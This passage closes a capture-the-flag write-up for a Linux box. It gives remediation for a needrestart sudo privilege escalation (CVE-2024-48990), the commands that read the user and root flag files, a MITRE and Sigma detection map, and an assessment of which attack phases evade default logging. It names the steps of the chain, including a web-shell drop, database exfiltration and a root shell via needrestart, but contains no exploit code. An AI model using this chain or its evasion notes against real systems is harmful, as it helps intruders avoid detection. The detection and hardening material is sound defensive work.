**Remediation:**
1. Remove `needrestart` from the sudoers configuration for `fismathack`: there is no operational justification for a standard user to invoke a package management utility as root without a password.
2. Update needrestart to version 3.8 or later, which addresses CVE-2024-48990.
3. As a general principle: any utility that loads and evaluates user-supplied files (Perl configs, Python scripts, shell scripts) must never appear in a sudoers configuration without strict path validation or argument restrictions.

**OpSec Rating:** Loud: `needrestart` spawning a Perl interpreter spawning a root shell is a high-confidence privilege escalation process chain detectable by EDR and process ancestry analysis. The auth.log entry with the malicious `-c` argument is permanently recorded.

---

## Flags

| | |
|---|---|
| User | `cat /home/fismathack/user.txt` |
| Root | `cat /root/root.txt` |

---

## Detection Map

| Step | MITRE | Log Source | Sigma Rule | OpSec |
|---|---|---|---|---|
| Port scan | T1046 | Network / firewall | proc_creation_lnx_susp_nmap.yml | Loud |
| Web enumeration | T1083 | /var/log/apache2/access.log | web_scan_generic_product.yml | Loud |
| XSLT fingerprinting | T1592 | /var/log/apache2/access.log |: | Silent |
| XXE capability testing | T1190 | /var/log/apache2/access.log | web_attack_xxe.yml | Silent |
| EXSLT file write + shell | T1190 | /var/log/apache2/access.log, syslog, network | file_creation_lnx_web_shell.yml | Loud |
| DB exfiltration | T1005 | syslog, network, auditd | proc_creation_lnx_python_http_server.yml | Moderate |
| SSH lateral movement | T1021.004 / T1078 | /var/log/auth.log | lnx_auth_successful_ssh_login_from_new_source.yml | Moderate |
| Sudo enumeration | T1069 | /var/log/auth.log | lnx_sudo_privilege_enumeration.yml | Silent |
| needrestart LPE | T1548.003 / CVE-2024-48990 | /var/log/auth.log, auditd, EDR | lnx_sudo_needrestart_lpe.yml | Loud |

---

## Would I Get Caught

**Assumed environment:** Default Ubuntu installation running Apache, Python/Flask, and standard system utilities. No WAF, no EDR agent, no auditd rules beyond defaults, no SIEM ingesting local logs. Standard syslog, Apache access logging, and auth.log only.

**Verdict:** No. The complete attack chain from reconnaissance to root executes without a single real-time alert. Every phase leaves log evidence, but none of it is monitored in a default configuration. The most consequential log: the Apache access log containing the XSLT upload sequence: accumulates silently.

**The single control that breaks the entire chain:** Disabling the `exsl:document` extension in the libxslt processing configuration. Without the file write primitive, there is no mechanism to deliver a payload to the scripts directory. The blocked `file://` and HTTP URI vectors are already restricted: completing that restriction to include EXSLT output functions eliminates the foothold entirely. Every subsequent step: database access, credential recovery, SSH pivot, needrestart exploitation: is unreachable.

**Where a tuned environment catches this operation:**

File integrity monitoring on `/var/www/` would alert the moment `shell.py` is written to the scripts directory: before the cron job executes it. This is the earliest viable detection point and completely prevents shell delivery. If that is bypassed, the `needrestart` invocation with `-c cmd.conf` produces an auth.log entry with a non-standard config path that a SIEM rule would flag as the known CVE-2024-48990 exploitation pattern.

**What remains undetectable regardless of environment:**

XSLT processor fingerprinting via `system-property()` is syntactically valid input that produces no anomaly signal in any monitoring configuration. Iterative capability testing (XXE entity tests, write path enumeration) generates only modest POST volume to the upload endpoint: indistinguishable from legitimate conversion activity without content inspection. MD5 hash cracking is entirely offline. Sudo enumeration with `sudo -l` generates one low-severity auth.log entry that no default rule monitors. These phases are the quiet core of the operation: the exposure is entirely at the file write and privilege escalation stages.
